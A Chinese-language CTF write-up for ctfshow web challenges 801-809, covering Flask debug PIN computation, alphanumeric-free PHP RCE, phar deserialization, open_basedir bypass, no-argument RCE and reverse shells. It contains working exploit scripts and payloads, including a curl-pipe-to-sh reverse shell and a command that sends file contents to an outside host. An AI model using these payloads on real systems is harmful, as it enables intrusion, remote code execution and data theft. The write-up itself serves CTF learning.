---
id: ctfshow-常用姿势
title: ctfshow-常用姿势
sidebar_position: 19
---



## 801-flask算pin

输入不存在的值使其报错，可以看到是flask开启了debug模式的界面，将鼠标移到任意一行上就可以看到右边有个terminal的标记，点击要我们输入pin码，这个pin码在跑flask的时候会给在终端里



本题考点就是利用任意文件读获取信息再利用脚本来跑出这个pin码

计算pin所需要的值为：

1. username：
   flask所登录的用户名，可以读`/etc/passwd` 或者 `getpass.getuser()`

2. modname：
   默认为flask.app

3. appname：
   默认为Flask
   `getattr(app, “name”, app.class.name)`

4. moddir：
   flask库下app.py的绝对路径，可通过报错得到 或者 `getattr(mod,"__file__",None)`

5. uuidnode：
   当前网络的mac地址的十进制数，读网卡:
   如`/sys/class/net/ens0/address` 或 `/sys/class/net/eth0/address`

6. machine_id：
   docker机器id
   linux的id一般存放于`/etc/machine-id` 或`/proc/sys/kernel/random/boot_id`
   docker的则读取`/proc/self/cgroup`取`/docker/`后的字符


   （但在本题要读`/proc/sys/kernel/random/boot_id`
   和`/proc/self/cgroup`然后将其拼接起来）



脚本附上：

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'root'# /etc/passwd
    'flask.app',# 默认值
    'Flask',# 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # 报错得到
]

private_bits = [
    '2485377585129',#  /sys/class/net/ens0/address or /sys/class/net/eth0/address
    '653dc458-4634-42b1-9a7a-b22a082e1fce18de34833d56b14e3178cdffe0c6fd87895b75d5affd11b0ff6d8a3340f26d6d'#  /proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

然后得到一个可交互的：

```
import os
os.popen('cat /flag').read()
```

![](https://s2.loli.net/2022/03/22/cFGjSJgoa8NnOA4.png)





## 802-无子母数字RCE

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

error_reporting(0);
highlight_file(__FILE__);
$cmd = $_POST['cmd'];

if(!preg_match('/[a-z]|[0-9]/i',$cmd)){
    eval($cmd);
}
```

顾名思义就是把字母数字都给过滤掉了

可以利用像异或、自增、取反：`$、+、-、^、~、|`来构造payload

1. [一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
2. [无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
3. [无字母数字绕过正则总结（含上传临时文件、异或、或、取反、自增脚本-羽](https://blog.csdn.net/miuzzx/article/details/109143413)
4. [ctfshow web入门 web41_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/108569080)

具体原理不赘述了==，给上群主师傅的脚本吧

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 14:35:44
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 16:41:46
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$precode=<<<code
\$_=('@'^'!');
\$__=\$_++;
\$___=++\$__;
\$____=++\$___;
\$_____=++\$____;
\$______=++\$_____;
\$_______=++\$______;
\$________=++\$_______;
\$_________=++\$________;
\$__________=++\$_________;
\$___________=++\$__________;
\$____________=++\$___________;
\$_____________=++\$____________;
\$______________=++\$_____________;
\$_______________=++\$______________;
\$________________=++\$_______________;
\$_________________=++\$________________;
\$__________________=++\$_________________;
\$___________________=++\$__________________;
\$____________________=++\$___________________;
\$_____________________=++\$____________________;
\$______________________=++\$_____________________;
\$_______________________=++\$______________________;
\$________________________=++\$_______________________;
\$_________________________=++\$________________________;
\$__________________________=++\$_________________________;
\$_=('@'^'!');
code;

eval($precode);


#使用异或生成任意无字母数字代码
function createCode($code){
	global $precode;
	$ret = "";
	for ($i=0; $i < strlen($code); $i++) { 

		$c = $code[$i];
		if(ord($c)<97 || ord($c)>122){
			$ret .= "$c";
		}else{
			$ret .= '$'.str_repeat('_', ord($c)-96);
		}

		
	}
	return urlencode("$precode(\"".substr($ret,0,stripos($ret, "("))."\")".substr($ret, stripos($ret,"(")));
}


echo createCode('system("tac flag.php");');
```

## 803-phar文件包含



```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


error_reporting(0);
highlight_file(__FILE__);
$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

跟学姐学习一下：[phar反序列化漏洞学习 - beiwo - 博客园 (cnblogs.com)](https://www.cnblogs.com/wkzb/p/15783434.html)

> 一、phar 文件由四部分构成：
>
> 1. stub
>
>    可以理解为 phar 文件的标志，必须以 `xxx __HALT_COMPILER();?>` 结尾，否则无法识别。`xxx` 可以为自定义内容。
>
> 2. manifest
>
>    phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 meta-data，这是漏洞利用最核心的地方。
>
> 3. content
>
>    被压缩文件的内容
>
> 4. signature (可空)
>
>    签名，放在末尾。
>
> 
>
> 二、phar文件生成：
>
> ```php
> 
> <?php
>     class TestObject {
>     }
> 
>     @unlink("phar.phar");
>     $phar = new Phar("phar.phar"); //后缀名必须为phar
>     $phar->startBuffering();
>     $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
>     $o = new TestObject();
>     $phar->setMetadata($o); //将自定义的meta-data存入manifest
>     $phar->addFromString("test.txt", "test"); //添加要压缩的文件
>     //签名自动计算
>     $phar->stopBuffering();
> ?>
> ```
>
> 三、phar文件包含利用条件
>
> 1. phar 文件要能够上传到服务器端
> 2. 要有可用的魔术方法作为跳板
> 3. 文件操作函数的参数可控，且 “:”、“/”、“phar” 等特殊字符没有被过滤
>
> ```
> 知道创宇404实验室的研究员 seaii 更为我们指出了所有文件函数均可使用（https://paper.seebug.org/680/ ）：
> 
> fileatime / filectime / filemtime
> stat / fileinode / fileowner / filegroup / fileperms
> file / file_get_contents / readfile / fopen`
> file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable
> parse_ini_file
> unlink
> copy
> ```



本题是把file和context分开上传，那么先生成phar文件：

本题poc：

```php
<?php
$phar = new Phar("a.phar");
$phar->startBuffering();
$phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ?>');
$phar->addFromString("a.txt", "<?php eval(\$_POST[1]);?>");
$phar->stopBuffering();
```

然后上传并利用file_exists触发phar：

```python
import requests
url="http://4753edb4-561f-452f-bae3-2b84b0c44407.challenge.ctf.show/"
# 上传phar文件
requests.post(url,data={'file':'/tmp/a.phar','content':open('a.phar','rb').read()})
# phar文件包含
r=requests.post(url,data={'file':'phar:///tmp/a.phar/a','content':'123','1':'system("cat f*");'})
print(r.text)
```

## 804-phar文件包含

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


error_reporting(0);
highlight_file(__FILE__);


class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

多了个类的利用，改一下poc：

```php
<?php
class hacker{
    public $code="system('cat f*');";
}

$a = new hacker();
echo urlencode(serialize($a));

# 下面这部分就没改
$phar = new Phar("a.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("a.txt", "123"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
```

上传，利用：

```python
import requests
url="http://41a1cf31-474d-4f62-8a18-49921eceeb33.challenge.ctf.show/"
requests.post(url,data={'file':'/tmp/a.phar','content':open('a.phar','rb').read()})
r=requests.post(url,data={'file':'phar:///tmp/a.phar/a','content':'123','1':'system("cat f*");'})
print(r.text)
```

## 805-open_basedir绕过

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


error_reporting(0);
highlight_file(__FILE__);

eval($_POST[1]);

```

说是要绕open_basedir，那先phpinfo看一下：

- open_basedir：`/var/www/html`
- disable_functions：system,exec,shell_exec,passthru,popen,fopen,popen,pcntl_exe

参考：

[浅谈几种Bypass open_basedir的方法 - Hookjoy - 博客园 (cnblogs.com)](https://www.cnblogs.com/hookjoy/p/12846164.html)

(ps:这里只尝试了2个方法，还有只能罗列根目录和open_basedir允许目录的glob://协议)

> open_basedir对命令执行函数没有限制，但是这里disable_function把命令执行函数ban了

### 利用chdir()与ini_set()绕过

```
1=
mkdir('hhh');chdir('hhh');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
echo file_get_contents('/ctfshowflag');
```

### 利用symlink()绕过

> ### 符号链接
>
> > 符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身。
>
> symlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接

需要跨几层目录就需要创建几层目录，简单说：

1. 创建软链接`qwe`指向`a/b/c/d`，然后创建软连接`tnt`指向`qwe/../../../ctfshowflag`，
   即`tnt`指向`a/b/c/d/../../../ctfshowflag`
2. 删除指向a/b/c/d的**链接文件**qwe，再创建文件夹`qwe`
   此时`tnt`指向`qwe/../../../ctfshowflag`即指向根目录下的ctfshowflag

```
1=
mkdir("a");
chdir("a");
mkdir("b");
chdir("b");
mkdir("c");
chdir("c");
mkdir("d");
chdir("d");
chdir("..");
chdir("..");
chdir("..");
chdir("..");
symlink("a/b/c/d","qwe");
symlink("qwe/../../../../ctfshowflag","tnt");
unlink("qwe");
mkdir("qwe");
```

然后访问：url/tnt

## 806-php无参RCE

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

highlight_file(__FILE__);

if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
?>
```

正则ban掉了`a('123')`这样的类型，只能是构造a(b(c()))这样的形式进行rce



> 可以用全局变量搭配一些函数取得字母进行rce
>
> 取全局变量：
>
> 1. getenv()
>
> 2. localeconv()
>
> 3. getallheaders()：apache2环境
>
> 4. get_defined_vars()：回显全局变量：`$_GET`、`$_POST`、`$_FILES`、`$_COOKIE`
>
> 5. session_id()：获取/设置当前会话id 
>    session_start()：创建新会话或重用现会话。 
>    如果通过 GET 、POST 或者用 cookie 提交了会话 ID, 则会重用现有会话
>
>    ```text
>    利用eval(hex2bin(session_id(session_start())));
>    然后传入cookie:PHPSESSID=payloadpayload=转为十六进制的"命令"
>    ```
>
> 6. getcwd()：获取当前目录 chdir()：更改当前目录 dirname()：返回路径中的目录部分
>
> 一些函数：
>
> 1. scandir(目录,[0|1:升|降序],[context])——列出指定路径中的文件和目录
> 2. localeconv()——返回一包含本地数字及货币格式信息的数组,数组第一项是.
> 3. current()——返回数组中的当前元素值, 默认取第一个值，别名为pos()
> 4. array_reverse()——逆向输出数组
> 5. array_flip()交换数组的键和值
> 6. array_rand()从数组随机一个或多个单元，不断刷新访问就会不断随机返回
> 7. end() - 将内部指针指向数组中的最后一个元素，并输出。
>    next() - 将内部指针指向数组中的下一个元素，并输出。
>    prev() - 将内部指针指向数组中的上一个元素，并输出。
>    reset() - 将内部指针指向数组中的第一个元素，并输出。
>    each() - 返回当前元素的键名和键值，并将内部指针向前移动。

这里用get_defined_vars()：

get_defined_vars()：返回由所有已定义变量所组成的数组，然后current指向数组`[_GET]`，end指向`[_GET]`数组中最后一位元素即咱们get最后的传参并输出，再用eval执行即可

```
?code=eval(end(current(get_defined_vars())));&b=system('cat /c*');
```

## 807-反弹shell



> [ctfshow-技术分享第3期_bilibili](https://www.bilibili.com/video/BV13P4y1M7EF?spm_id_from=333.999.0.0)
>
> ![](https://s2.loli.net/2022/05/16/3Enh64T2KUoNRLZ.png)
>
> ![](https://s2.loli.net/2022/05/16/i7xrHOkLJuKqh6l.png)
>
> 反弹shell失败的排查：
>
> - 是否为内网ip，IP地址是否准确、端口是否一致
> - 云服务器安全组/防火墙端口是否打开
> - 是否为轻量级服务器，安装了宝塔面板，需要再次开放宝塔面板上的防火墙端口
> - 是否服务器开启了**iptable**，需要开放反弹端口
> - 检测完毕后可以通过本地nc反弹的ip地址 端口来确定本地能正常反弹；windows下可用telenet反弹
>
> > 反弹shel的本质就是让对方服务器主动连接你指定的ip地址和端口，在大部分的服务器防火墙中，对
> > 入站的流量有详细和严格的监控，比如服务器只开放80和443端口，，其他端口不开放，这时候，就算服务端有个程序在9999端口监听，等你连接，你也连接不上
> > 但是，防火墙对服务器内部向外连接的流量，基本是全部放行。基于这个策略，我们通过反弹可以绕
> > 过服务器的防火墙检查

群主的好货[https://your-shell.com](https://your-shell.com/)

```
# Reverse Shell as a Service
# https://ctf.show/
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://your-shell.com/yourip:1337 | sh
#
# 3. Don't be a dick
```

```php
<?php

# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-03-19 12:10:55
# @Last Modified by:   h1xa
# @Last Modified time: 2022-03-19 13:27:18
# @email: h1xa@ctfer.com
# @link: https://ctfer.com


error_reporting(0);
highlight_file(__FILE__);
$url = $_GET['url'];

$schema = substr($url,0,8);

if($schema==="https://"){
    shell_exec("curl $url");
}

```

要求$url以https://开头，shell_exec用;直接截断就行，相当于无回显rce：

```
?url=https://;curl http://ip:8899?a=`cat /*`
```



## 808-php7.0文件包含崩溃卡临时文件



> [ctfshow-技术分享第3期_bilibili](https://www.bilibili.com/video/BV13P4y1M7EF?spm_id_from=333.999.0.0)
>
> ### 使用条件
>
> - php7.0
> - 有完整包含点，参数可控
> - /tmp目录可写
>
> ### 基本原理
>
> php脚本运行过程中，会自动给超全局变量赋值
>
> 如`http://***/?file=/etc/passwd`：我们并没有给`$_GET`这个数组进行赋值，php会自动解析ur格式，将fiLe作为键名放入`$_GET`变量中，并且赋值为`/etc/passwd`
>
> php的其他超全局变量也会类似如此处理
> 超全局变量：
>
> - `$GLOBALS`
> - `$_SERVER`
> - `$_GET`
> - `$_POST`
> - `$_FILES`
> - `$_COOKIE`
> - ``$_SESSION`
> - `$_REQUEST`
> - `$_ENV`
>
> 基于上面的原因，如果我们向一个php脚本发送文件上传表单，php会将上传的文件存放在一个临时目
> 录，等待php脚本处理，脚本运行结束后，无论php脚本是否处理这个上传文件，都会删除这个临时上
> 传文件
>
> 
>
> 也就是说：虽然我们可以控制上传临时文件的内容，但是脚本运行结束以后就会自动删除掉
> 基于这种情况，出现了2种利用方式：
>
> - 脚本运行结束之前就包含这个临时文件，执行里面的恶意代码，并生成后门，删除临时文件后不影响以后的命令执行，条件竞争就是这个原理。
> - 脚本运行结束之后不删除这个临时文件。这就是这个议题讨论的情况，想办法让脚本运行结束后不删除这个临时文件。
>
> 于是乎，现在的重点就是解决脚本运行结束之后，不删除这个临时文件。继续看下面的代码：
>
> ```php
> <?php
> echo "start"
> exit(0); //die();
> echo "exit";
> ```
>
> 这里可以看到，如果当前执行的php脚本，中途给退出了，就不执行后面的代码了，所以只要我们让
> php脚本可以中途退出，就能不删除我们上传的临时文件，就能包含恶意代码了。
> **PS: 这里有一个例外**
> **Shutdown函数和析构函数，代码中显式exit0或者die)以后，仍会执行**







## 809-pear文件包含/RCE



